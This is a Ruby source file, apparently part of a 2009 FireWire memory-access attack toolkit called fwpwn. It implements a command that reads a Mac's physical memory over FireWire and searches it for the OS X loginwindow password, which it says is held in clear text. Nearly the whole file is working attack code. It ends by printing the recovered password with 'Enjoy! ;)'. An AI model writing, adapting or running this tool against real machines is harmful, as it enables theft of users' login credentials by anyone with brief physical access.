# Copyright (c) 2009 iZsh - izsh at iphone-dev.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# =============
#  Description
# =============
# Mac OS X loginwindow.app password finder
# Yeah... Apple is so amazingly smart they keep it forever in memory in clear
# text.
require 'rubygems'
require 'optparse'
require 'ostruct'
require 'fw'

require 'general/fwselectoptions'
require 'general/memaddroptions'

module FWMacLoginPwd
  
  COMMAND = "macloginpwd"
  HELP = "Mac OS X loginwindow.app password finder."

  def self.parse(args)
    # default values
    options = OpenStruct.new
    
    # Build the command line/options
    opts = OptionParser.new do |opts|
      opts.banner = "Usage: fwpwn macosx #{COMMAND} [options]"
      FWSelectOptions::add_options(opts, options)
      MemaddrOptions::add_options(opts, options)
      opts.on_tail( "-h", "--help", "Display this screen" ) do
        puts opts
        exit
      end
    end

    begin
      # Parse
      opts.parse!(args)
      # Process the options
      FWSelectOptions::verify_selection(opts, options)
    rescue => message
      puts message
      puts ""
      puts opts
      exit      
    end

    # Execute the command!
    begin
      macloginpwd(options.device, options.beginaddr, options.endaddr, options.blocksize)
    rescue => message
      puts message
      exit
    end
  end


  class << self
    
    def macloginpwd(device, beginaddr, endaddr, blocksize)
      puts "Using device #{device}"
      puts "Reading from 0x#{beginaddr.to_s(16)} to 0x#{endaddr.to_s(16)}"
      puts "Block size 0x#{blocksize.to_s(16)}"
      buffer_last= ""
      # Loop
      beginaddr.step(endaddr-1, blocksize) do |pos|
        print "\r-> reading 0x%08x ..." % pos
        STDOUT.flush
        ret = device.read(pos, blocksize)
        unless ret[:resultcode] == 0
          raise "\nError code #{ret[:resultcode]} while reading " +
            "0x#{blocksize.to_s(16)} bytes at " + 
            "0x#{pos.to_s(16)}"
        end
        buffer = buffer_last + ret[:buffer]
        password = buffer[/password[\000]+([^\000]+)[\000]+shell/, 1]
        if password
          puts "\nFound Apple loginwindow.app password: " + password
          puts "Enjoy! ;)"
          break
        end
        buffer_last = ret[:buffer]        
      end # loop
    end
    
  end

end
